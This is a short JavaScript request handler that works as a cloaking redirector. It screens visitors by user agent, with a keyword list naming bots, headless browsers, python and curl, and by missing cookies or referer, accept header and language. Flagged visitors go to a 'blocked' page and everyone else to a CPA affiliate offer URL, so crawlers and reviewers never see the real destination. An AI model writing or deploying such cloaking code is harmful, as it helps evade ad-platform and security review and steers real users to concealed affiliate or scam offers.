export default function handler(req, res) {
  const ua = req.headers["user-agent"] || "";
  const ip =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress || "";
  const lang = req.headers["accept-language"] || "";
  const referer = req.headers["referer"] || "";
  const cookies = req.headers["cookie"] || "";
  const accept = req.headers["accept"] || "";

  const suspiciousUA = [
    "bot",
    "crawl",
    "spider",
    "headless",
    "scrapy",
    "python",
    "curl",
  ];
  const matchedUA = suspiciousUA.some((term) =>
    ua.toLowerCase().includes(term.toLowerCase())
  );
  const noCookie = !cookies || cookies.length < 5;
  const noReferer = !referer || referer.length < 5;
  const badAccept = !accept.includes("text/html");
  const langMismatch = !(lang.includes("en") || lang.includes("bn"));

  if (matchedUA || noCookie || noReferer || badAccept || langMismatch) {
    return res.redirect(302, "https://example.com/blocked");
  }

  return res.redirect(302, "https://your-cpa-offer.com");
}
